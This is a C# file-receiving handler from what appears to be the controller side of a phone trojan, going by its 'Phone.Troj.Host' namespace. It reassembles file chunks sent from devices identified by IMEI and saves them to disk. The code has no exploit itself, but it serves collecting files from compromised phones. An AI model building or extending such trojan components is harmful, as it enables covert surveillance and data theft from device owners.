using System.Collections.Generic;
using System.IO;
using InOut;
using InOut.PacketImp;
using InOut.Utils;

namespace IIE.Phone.Troj.Host.Handler
{
    public class FileHandler : IPacketHandler
    {
        private readonly IMainView gui;
        private readonly int channel;
        private readonly string imei;
        private short nextNumSeq;
        private readonly Dictionary<int, byte[]> tempData;
        private const short Max = 10;
        private readonly FileStream fout;

        public FileHandler(int chan, string imei, IMainView gui, string dir, string dwnName)
        {
            channel = chan;
            this.imei = imei;
            this.gui = gui;
            tempData = null;

            if (!Directory.Exists(dir))
                Directory.CreateDirectory(dir);
            fout = File.OpenWrite(Path.Combine(dir, dwnName));
            tempData = new Dictionary<int, byte[]>();
        }


        public void Receive(IPacket p, string tempIMEI)
        {

        }



        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            c.ChannelHandlerMap[imei].GetStorage(channel).Reset();
            var packet = (FilePacket)p;

            try
            {
                short numSeq = packet.NumSeq;

                if (numSeq == nextNumSeq)
                {
                    fout.WriteBytes(packet.Data);
                    FillFile(numSeq);
                    if (packet.Mf == 1)
                    {
                        nextNumSeq++;
                    }
                    else
                    {
                        gui.Log.LogTxt("File transfert complete !");
                        fout.Close();
                        c.ChannelHandlerMap[imei].RemoveListener(channel);
                    }
                }
                else
                {
                    if (tempData.Count <= Max)
                        tempData[numSeq] = packet.Data;
                    else
                    {
                        gui.Log.LogErrTxt("File chunk missing. Stop");
                        fout.Close();
                        c.ChannelHandlerMap[imei].RemoveListener(channel);
                    }
                }
            }
            catch (IOException)
            {
                gui.Log.LogErrTxt("IOException while trying to write in the file");
                c.ChannelHandlerMap[imei].RemoveListener(channel);
            }
        }

        private void FillFile(short numSeq)
        {
            short num = numSeq;
            while (tempData.ContainsKey(num + 1))
            {
                fout.WriteBytes(tempData[num + 1]);
                tempData.Remove(num + 1);
                num++;
            }
            nextNumSeq = num;
        }
    }
}
